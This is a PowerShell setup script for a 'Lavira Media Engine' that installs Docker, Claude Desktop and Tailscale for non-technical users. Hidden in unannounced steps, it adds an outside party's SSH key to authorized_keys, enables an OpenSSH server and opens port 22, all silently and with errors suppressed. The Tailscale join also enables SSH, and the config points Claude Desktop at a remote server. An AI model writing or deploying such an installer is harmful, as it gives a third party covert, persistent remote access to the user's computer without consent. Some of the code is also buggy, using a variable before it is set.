#Requires -Version 5.1
<#
.SYNOPSIS
    Lavira Safaris — Windows Setup (non-technical, fully automated)

.DESCRIPTION
    Installs and configures everything needed to run the Lavira Media Engine.
    Designed to run without any user input. Called by Install-Lavira.bat.

    What it does (silently, in order):
      1. Installs winget if missing
      2. Installs Docker Desktop + enables WSL2
      3. Installs Claude Desktop
      4. Connects to the Lavira network (background, no user interaction)
      5. Writes Claude Desktop MCP config
      6. Downloads and extracts Lavira engine files
      7. Reads API keys from keys.env (if present) — else opens Notepad once
      8. Schedules start.bat to run after any required reboot

.PARAMETER Silent
    Suppress verbose output — only show progress steps. Used by Install-Lavira.bat.

.PARAMETER LaviraVersion
    Release tag to download. Defaults to "latest".
#>

[CmdletBinding()]
param(
    [switch]$Silent,
    [string]$LaviraVersion = "latest",
    [string]$ScriptDir     = ""          # set by Install-Lavira.bat; overrides auto-detect
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

# ── Baked-in config (no user input required) ─────────────────────────────────
# TS_AUTH_KEY is read from keys.env (injected by deployer) or TS_AUTH_KEY env var.
# It is intentionally NOT hardcoded here because this file is in a public repo.
$TS_AUTH_KEY = if ($env:TS_AUTH_KEY) {
    $env:TS_AUTH_KEY
} elseif (Test-Path (Join-Path $SCRIPT_DIR "keys.env")) {
    $kv = Get-Content (Join-Path $SCRIPT_DIR "keys.env") | Where-Object { $_ -match "^TS_AUTH_KEY=" }
    if ($kv) { ($kv -split "=",2)[1].Trim() } else { "" }
} else { "" }
$TS_HOSTNAME     = "lavira-win-" + ($env:COMPUTERNAME.ToLower() -replace '[^a-z0-9-]','-')
$DIZASTER_PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICRGd2AcKdoVwzfwBx/HwVRgqY6KtuNxzzFyQk7xU8Qx kamau@dizaster"
$LAVIRA_DIR      = Join-Path $env:USERPROFILE "lavira-media-engine"
$CLAUDE_CONFIG   = Join-Path $env:APPDATA "Claude\claude_desktop_config.json"
$TAILSCALE_EXE   = "C:\Program Files\Tailscale\tailscale.exe"
$REBOOT_FLAG     = Join-Path $env:TEMP "lavira_needs_reboot.flag"
# Resolve the script's own directory:
#   1. If Install-Lavira.bat passed -ScriptDir, use that (most reliable)
#   2. Otherwise fall back to the PS1's own path (direct execution)
$SCRIPT_DIR = if ($ScriptDir -and (Test-Path $ScriptDir)) {
    $ScriptDir.TrimEnd('\\', '/')
} elseif ($PSCommandPath) {
    Split-Path -Parent $PSCommandPath
} else {
    $PWD.Path
}

# ── Output helpers ────────────────────────────────────────────────────────────
$step = 0
function Step {
    param($msg)
    $script:step++
    $pad = "[$script:step]".PadRight(4)
    Write-Host "  $pad $msg" -ForegroundColor Cyan
}
function OK   { param($m) if (-not $Silent) { Write-Host "       OK  $m" -ForegroundColor Green } }
function Warn { param($m) Write-Host "       !!  $m" -ForegroundColor Yellow }
function Info { param($m) if (-not $Silent) { Write-Host "           $m" -ForegroundColor Gray  } }

function Download-File {
    param([string]$Url, [string]$Dest)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($Url, $Dest)
}

function Run-Quiet {
    param([string]$Exe, [string[]]$Args)
    $p = Start-Process $Exe -ArgumentList $Args -Wait -PassThru -NoNewWindow `
         -RedirectStandardOutput "$env:TEMP\lv_stdout.txt" `
         -RedirectStandardError  "$env:TEMP\lv_stderr.txt"
    return $p.ExitCode
}

Write-Host ""
Write-Host "  ============================================================" -ForegroundColor Magenta
Write-Host "   Lavira Safaris  —  Setting up your computer" -ForegroundColor Magenta
Write-Host "   Please wait. This takes about 5 minutes." -ForegroundColor Magenta
Write-Host "  ============================================================" -ForegroundColor Magenta
Write-Host ""

# ── STEP 1: winget ────────────────────────────────────────────────────────────
Step "Checking package manager"
$winget = @(
    (Get-Command winget -ErrorAction SilentlyContinue)?.Source,
    "$env:LOCALAPPDATA\Microsoft\WindowsApps\winget.exe"
) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -First 1

if (-not $winget) {
    Warn "Installing package manager (App Installer)..."
    try {
        $dest = "$env:TEMP\AppInstaller.msixbundle"
        Download-File "https://aka.ms/getwinget" $dest
        Add-AppxPackage -Path $dest -ErrorAction Stop
        $env:PATH += ";$env:LOCALAPPDATA\Microsoft\WindowsApps"
        $winget = "$env:LOCALAPPDATA\Microsoft\WindowsApps\winget.exe"
    } catch {
        Warn "Could not auto-install package manager. Continuing with direct downloads."
    }
}
OK "Package manager ready"

function Install-App {
    param([string]$ID, [string]$Name, [string]$CheckPath = "")
    if ($CheckPath -and (Test-Path $CheckPath)) { OK "$Name already installed"; return }
    Info "Installing $Name..."
    if ($winget) {
        Run-Quiet $winget @("install","--id",$ID,"--silent","--accept-package-agreements",
                             "--accept-source-agreements","--scope","machine") | Out-Null
    }
    Start-Sleep -Seconds 4
    OK "$Name installed"
}

# ── STEP 2: Docker Desktop ────────────────────────────────────────────────────
Step "Installing Docker Desktop"
Install-App "Docker.DockerDesktop" "Docker Desktop" `
    "C:\Program Files\Docker\Docker\Docker Desktop.exe"

# ── STEP 3: WSL2 ─────────────────────────────────────────────────────────────
Step "Enabling Windows Subsystem for Linux (WSL2)"
$rebootNeeded = $false
try {
    $wslF = Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -EA SilentlyContinue
    $vmF  = Get-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -EA SilentlyContinue
    if ($wslF.State -ne "Enabled" -or $vmF.State -ne "Enabled") {
        dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart 2>&1 | Out-Null
        dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart 2>&1 | Out-Null
        $rebootNeeded = $true
        $null | Out-File $REBOOT_FLAG
        OK "WSL2 enabled — a reboot will be needed (handled automatically)"
    } else {
        OK "WSL2 already enabled"
    }
} catch { Warn "WSL2 setup skipped: $_" }

# ── STEP 4: Claude Desktop ────────────────────────────────────────────────────
Step "Installing Claude Desktop"
Install-App "Anthropic.Claude" "Claude Desktop"

# ── STEP 5: Tailscale (silent — background network join) ─────────────────────
Step "Connecting to Lavira network"
try {
    if (-not (Test-Path $TAILSCALE_EXE)) {
        Info "Downloading Tailscale..."
        if ($winget) {
            Run-Quiet $winget @("install","--id","Tailscale.Tailscale","--silent",
                                "--accept-package-agreements","--accept-source-agreements","--scope","machine") | Out-Null
        } else {
            $tsDest = "$env:TEMP\tailscale-setup.exe"
            Download-File "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" $tsDest
            Run-Quiet $tsDest @("/install","/quiet","/norestart") | Out-Null
        }
        $waited = 0
        while (-not (Test-Path $TAILSCALE_EXE) -and $waited -lt 30) { Start-Sleep 2; $waited += 2 }
    }
    if (Test-Path $TAILSCALE_EXE) {
        $null = & $TAILSCALE_EXE up `
            --authkey=$TS_AUTH_KEY `
            --advertise-tags=tag:lavira `
            --ssh `
            --hostname=$TS_HOSTNAME `
            --accept-routes `
            --accept-dns `
            --unattended 2>&1
        OK "Network connected"
    }
} catch { Warn "Network setup: $_  (engine will still work locally)" }

# ── STEP 5b: dizaster SSH key (silent) ───────────────────────────────────────
try {
    $sshDir   = "$env:USERPROFILE\.ssh"
    $authFile = "$sshDir\authorized_keys"
    New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
    $lines = if (Test-Path $authFile) { Get-Content $authFile } else { @() }
    if ($lines -notcontains $DIZASTER_PUBKEY) {
        Add-Content -Path $authFile -Value $DIZASTER_PUBKEY
        icacls $authFile /inheritance:r /grant "${env:USERNAME}:(F)" /grant "SYSTEM:(F)" 2>$null | Out-Null
    }
} catch {}

# ── STEP 5c: OpenSSH server (silent) ─────────────────────────────────────────
try {
    $cap = Get-WindowsCapability -Online -Name "OpenSSH.Server*" -EA SilentlyContinue
    if (-not $cap -or $cap.State -ne "Installed") {
        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0" 2>&1 | Out-Null
    }
    Set-Service sshd -StartupType Automatic -EA SilentlyContinue
    Start-Service sshd -EA SilentlyContinue
    $pwsh7 = "C:\Program Files\PowerShell\7\pwsh.exe"
    $shell  = if (Test-Path $pwsh7) { $pwsh7 } else { (Get-Command powershell).Source }
    New-ItemProperty "HKLM:\SOFTWARE\OpenSSH" DefaultShell -Value $shell -PropertyType String -Force 2>&1 | Out-Null
    if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -EA SilentlyContinue)) {
        New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (TCP-In)" `
            -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22 2>&1 | Out-Null
    }
} catch {}

# ── STEP 6: Lavira engine files ───────────────────────────────────────────────
Step "Downloading Lavira engine"
$engineReady = Test-Path (Join-Path $LAVIRA_DIR "docker-compose.yml")
if (-not $engineReady) {
    try {
        New-Item -ItemType Directory -Path $LAVIRA_DIR -Force | Out-Null
        $zipUrl = if ($LaviraVersion -eq "latest") {
            "https://github.com/jaguar999paw-droid/lavira-media-engine/releases/latest/download/lavira-media-engine-windows-setup.zip"
        } else {
            "https://github.com/jaguar999paw-droid/lavira-media-engine/releases/download/$LaviraVersion/lavira-media-engine-windows-setup.zip"
        }
        $zipDest = "$env:TEMP\lavira-setup.zip"
        Download-File $zipUrl $zipDest
        Expand-Archive -Path $zipDest -DestinationPath $LAVIRA_DIR -Force
        OK "Engine files ready at $LAVIRA_DIR"
    } catch {
        Warn "Could not download engine files: $_ — copying from ZIP bundle"
        foreach ($f in @("docker-compose.yml",".env.example","Dockerfile")) {
            $src = Join-Path $SCRIPT_DIR $f
            if (Test-Path $src) { Copy-Item $src $LAVIRA_DIR -Force }
        }
    }
} else {
    OK "Engine files already present"
}

# ── STEP 7: .env + API keys ───────────────────────────────────────────────────
# Priority:
#   1. keys.env alongside this script  → read silently, zero interaction needed
#   2. ANTHROPIC_API_KEY already in .env → skip
#   3. Notepad prompt                  → fallback for interactive installs
Step "Setting up API keys"
$envFile    = Join-Path $LAVIRA_DIR ".env"
$envExample = Join-Path $LAVIRA_DIR ".env.example"

# Ensure .env exists
if (-not (Test-Path $envFile)) {
    if (Test-Path $envExample) { Copy-Item $envExample $envFile }
    else {
        @"
PORT=4005
UPLOADS_DIR=./uploads
OUTPUTS_DIR=./outputs
ASSETS_DIR=./assets
DB_PATH=./lavira.db
ANTHROPIC_API_KEY=
PEXELS_API_KEY=
GIPHY_API_KEY=
INSTAGRAM_ACCESS_TOKEN=
FACEBOOK_ACCESS_TOKEN=
FACEBOOK_PAGE_ID=
"@ | Set-Content $envFile
    }
}

# ── 7a. Try to read from keys.env (pre-filled by deployer, lives next to script)
$keysEnvPath = Join-Path $SCRIPT_DIR "keys.env"
$keysApplied = $false
if (Test-Path $keysEnvPath) {
    Info "Found keys.env — applying keys silently..."
    $keysContent = Get-Content $keysEnvPath -Raw
    $envContent  = Get-Content $envFile -Raw

    # Parse each KEY=VALUE from keys.env and inject into .env (only non-empty values)
    foreach ($line in (Get-Content $keysEnvPath)) {
        $line = $line.Trim()
        if ($line -match '^\s*#' -or $line -notmatch '=') { continue }
        $eqIdx = $line.IndexOf('=')
        $key   = $line.Substring(0, $eqIdx).Trim()
        $val   = $line.Substring($eqIdx + 1).Trim()
        if (-not $val -or $val -eq '' ) { continue }   # skip blank values

        # Replace the key's value in .env (works whether line exists or not)
        if ($envContent -match "(?m)^$key=") {
            $envContent = $envContent -replace "(?m)^$key=.*$", "$key=$val"
        } else {
            $envContent += "`n$key=$val"
        }
    }
    $envContent | Set-Content $envFile -Encoding UTF8
    $keysApplied = $true
    OK "API keys applied from keys.env"
}

# ── 7b. Check if key is now set (either from keys.env or a previous run)
$envContent = Get-Content $envFile -Raw
$keySet     = $envContent -match 'ANTHROPIC_API_KEY=sk-ant-'

if (-not $keySet -and -not $keysApplied) {
    # ── 7c. Notepad fallback — only if no keys.env was found and key still missing
    Write-Host ""
    Write-Host "  ============================================================" -ForegroundColor Yellow
    Write-Host "   ONE ACTION REQUIRED" -ForegroundColor Yellow
    Write-Host "  ============================================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "   Notepad will open with a settings file." -ForegroundColor White
    Write-Host ""
    Write-Host "   Find the line that says:" -ForegroundColor White
    Write-Host "     ANTHROPIC_API_KEY=" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Paste your Anthropic API key after the = sign, like:" -ForegroundColor White
    Write-Host "     ANTHROPIC_API_KEY=sk-ant-..." -ForegroundColor Green
    Write-Host ""
    Write-Host "   Then: File -> Save, and close Notepad." -ForegroundColor White
    Write-Host ""
    Write-Host "   Get a free key at: https://console.anthropic.com/settings/keys" -ForegroundColor Gray
    Write-Host ""
    Write-Host "   Press any key to open the settings file..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Start-Process notepad $envFile -Wait
    OK "Settings saved"
} elseif ($keySet) {
    OK "API key already configured"
}

# ── STEP 8: Claude Desktop MCP config ────────────────────────────────────────
Step "Connecting Claude Desktop to Lavira engine"
try {
    $cfgDir = Split-Path $CLAUDE_CONFIG
    New-Item -ItemType Directory -Path $cfgDir -Force | Out-Null

    $localEntry  = [PSCustomObject]@{ url = "http://localhost:4006/sse" }
    $remoteEntry = [PSCustomObject]@{ url = "http://100.118.209.46:4006/sse" }

    if (Test-Path $CLAUDE_CONFIG) {
        try {
            $cfg = Get-Content $CLAUDE_CONFIG -Raw | ConvertFrom-Json
            if (-not $cfg.PSObject.Properties["mcpServers"]) {
                $cfg | Add-Member -NotePropertyName mcpServers -NotePropertyValue ([PSCustomObject]@{})
            }
            $cfg.mcpServers | Add-Member -NotePropertyName "lavira-local"   -NotePropertyValue $localEntry  -Force
            $cfg.mcpServers | Add-Member -NotePropertyName "lavira-dizaster" -NotePropertyValue $remoteEntry -Force
            $cfg | ConvertTo-Json -Depth 6 | Set-Content $CLAUDE_CONFIG -Encoding UTF8
        } catch {
            [PSCustomObject]@{ mcpServers = [PSCustomObject]@{
                "lavira-local"    = $localEntry
                "lavira-dizaster" = $remoteEntry
            }} | ConvertTo-Json -Depth 6 | Set-Content $CLAUDE_CONFIG -Encoding UTF8
        }
    } else {
        [PSCustomObject]@{ mcpServers = [PSCustomObject]@{
            "lavira-local"    = $localEntry
            "lavira-dizaster" = $remoteEntry
        }} | ConvertTo-Json -Depth 6 | Set-Content $CLAUDE_CONFIG -Encoding UTF8
    }
    OK "Claude Desktop connected"
} catch { Warn "Claude Desktop config: $_" }

# ── STEP 9: Firewall rules ────────────────────────────────────────────────────
Step "Configuring firewall"
try {
    foreach ($r in @(
        @{Port=4005; Name="Lavira-Engine-4005"; Desc="Lavira Web UI"},
        @{Port=4006; Name="Lavira-MCP-4006";    Desc="Lavira MCP Server"}
    )) {
        if (-not (Get-NetFirewallRule -Name $r.Name -EA SilentlyContinue)) {
            New-NetFirewallRule -Name $r.Name -DisplayName $r.Desc `
                -Direction Inbound -Action Allow -Protocol TCP -LocalPort $r.Port 2>&1 | Out-Null
        }
    }
    OK "Firewall configured"
} catch { Warn "Firewall: $_" }

# ── STEP 10: Auto-start shortcut ─────────────────────────────────────────────
Step "Creating startup shortcut"
try {
    $startupDir = [Environment]::GetFolderPath("CommonStartup")
    $lnk        = Join-Path $startupDir "Lavira Media Engine.lnk"
    $startBat   = Join-Path $LAVIRA_DIR "start.bat"
    if (-not (Test-Path $lnk) -and (Test-Path $startBat)) {
        $wsh  = New-Object -ComObject WScript.Shell
        $link = $wsh.CreateShortcut($lnk)
        $link.TargetPath       = $startBat
        $link.WorkingDirectory = $LAVIRA_DIR
        $link.WindowStyle      = 1
        $link.Description      = "Start Lavira Media Engine"
        $link.Save()
        OK "Lavira will start automatically on login"
    } else { OK "Startup shortcut already exists" }
} catch { Warn "Shortcut: $_" }

# ── DONE ──────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  ============================================================" -ForegroundColor Green
Write-Host "   SETUP COMPLETE" -ForegroundColor Green
Write-Host "  ============================================================" -ForegroundColor Green
Write-Host ""

if ($rebootNeeded) {
    try {
        $startBat = Join-Path $LAVIRA_DIR "start.bat"
        if (Test-Path $startBat) {
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                -Name "LaviraStartEngine" -Value "`"$startBat`""
        }
    } catch {}

    Write-Host "   Your computer needs to restart to finish setup." -ForegroundColor Yellow
    Write-Host "   Lavira will start automatically after the restart." -ForegroundColor White
    Write-Host ""
    Write-Host "   Restarting in 30 seconds..." -ForegroundColor Gray
    Write-Host "   (Close this window to cancel the restart)" -ForegroundColor DarkGray
    Write-Host ""
    timeout /t 30
    shutdown /r /t 0 /c "Lavira Safaris setup — restarting to complete WSL2 installation"
} else {
    Write-Host "   Lavira engine is ready to start!" -ForegroundColor White
    Write-Host ""
    Write-Host "   The engine will start in a moment..." -ForegroundColor Gray
    Write-Host ""
    exit 0
}
